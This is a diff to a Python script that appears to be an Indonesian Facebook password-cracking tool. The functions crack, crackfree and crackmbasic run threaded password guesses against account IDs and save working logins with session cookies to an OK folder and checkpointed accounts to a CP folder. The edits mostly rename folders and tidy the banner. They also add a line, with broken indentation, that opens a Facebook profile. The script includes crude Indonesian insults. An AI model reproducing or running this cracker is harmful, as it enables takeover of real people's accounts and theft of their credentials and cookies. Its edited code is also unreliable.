@@ -91,7 +91,7 @@ hh = '\033[92m' # HIJAU -
 u = '\033[95m' # UNGU
 kk = '\033[1;92m' # KUNING -
 b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
+p = '\x1b[0;34m' #005FFF +
 asu = random.choice([m,k,h,u,b])
 #--------------------[ CONVERTER-BULAN ]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
@@ -112,17 +112,16 @@ def back():
 def banner():
 	clear()
 	sol()
-	ban=
-
-	 __    __  ____  _____   ____  ____   ___   
-|  |__|  ||    ||     | /    ||    \ |   \  
-|  |  |  | |  | |__/  ||  o  ||  D  )|    \ 
+	ban='''
+__    __  ____  _____   ____  ____   ___
+|  |__|  ||    ||     | /    ||    \ |   \
+|  |  |  | |  | |__/  ||  o  ||  D  )|    \
 |  |  |  | |  | |   __||     ||    / |  D  |
 |  `  '  | |  | |  /  ||  _  ||    \ |     |
  \      /  |  | |     ||  |  ||  .  \|     |
-  \_/\_/  |____||_____||__|__||__|\_||_____|
-                                            
-	cetak(nel(ban, style='white'))
+  \_/\_/  |____||_____||__|__||__|\_||_____!
+                                            '''
+        cetak(nel(ban, style='white'))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -306,8 +305,8 @@ def setting():
 def passwrd():
 	print(f'>>>>> {m}•{k}•{h}•{x} Sabar Kontol Mending Coli Dulu {m}•{k}•{h}•{x} <<<<< ')
 	print('')
-	print(f'>> Results {h}💫OK💫{x} Save in : {h}💫OK💫/%s {x}'%(okc))
-	print(f'>> Results {k}😭CP😭{x} Save in : {k}😭CP😭/%s {x}'%(cpc))
+	print(f'>> Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
+	print(f'>> Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
 	print(f'>> Play Airplane Mode Every 500 ID\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -371,7 +370,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{b}CHECKPOINT : {K}{idf}|{pw}')
 				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
-				open('😭CP😭/'+cpc,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -383,7 +382,7 @@ def crack(idf,pwv):
 				print(f'\r{b}SUCCESFULY : {H}{idf}|{pw}')
 				print(f'\r{x}*-->{x} {H}{kuki}{H}')
 				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
-				open('💫OK💫/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				#os.popen('play-audio data/ok.mp3')
 				cek_apk(session,coki)
 				break
@@ -413,7 +412,7 @@ def crackfree(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{b}CHECKPOINT : {K}{idf}|{pw}')
 				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
-				open('😭CP😭/'+cpc,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -425,7 +424,7 @@ def crackfree(idf,pwv):
 				print(f'\r{b}SUCCESFULY : {H}{idf}|{pw}')
 				print(f'\r{x}*-->{x} {H}{kuki}{H}')
 				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
-				open('💫OK💫/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				#os.popen('play-audio data/ok.mp3')
 				cek_apk(session,coki)
 				break
@@ -455,7 +454,7 @@ def crackmbasic(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{b}CHECKPOINT : {K}{idf}|{pw}')
 				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
-				open('😭CP😭/'+cpc,'a').write(idf+'|'+pw+'\n')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -467,7 +466,7 @@ def crackmbasic(idf,pwv):
 				print(f'\r{b}SUCCESFULY : {H}{idf}|{pw}')
 				print(f'\r{x}*-->{x} {H}{kuki}{H}')
 				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
-				open('💫OK💫/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				#os.popen('play-audio data/ok.mp3')
 				cek_apk(session,coki)
 				break
@@ -481,13 +480,13 @@ def crackmbasic(idf,pwv):
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('💫OK💫')
+	try:os.mkdir('OK')
 	except:pass
-	try:os.mkdir('😭CP😭')
+	try:os.mkdir('CP')
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
-	login()
+    os.system("xdg-open https://www.facebook.com/profile.php?id=100011355877620")
+login()
 
-#>>>>> 😊THANKS TO💫THIS HERE😊 <<<<<<<#
-           #>>>>>>>>💫WIZARD💫<<<<<<<<<<<<#
+        
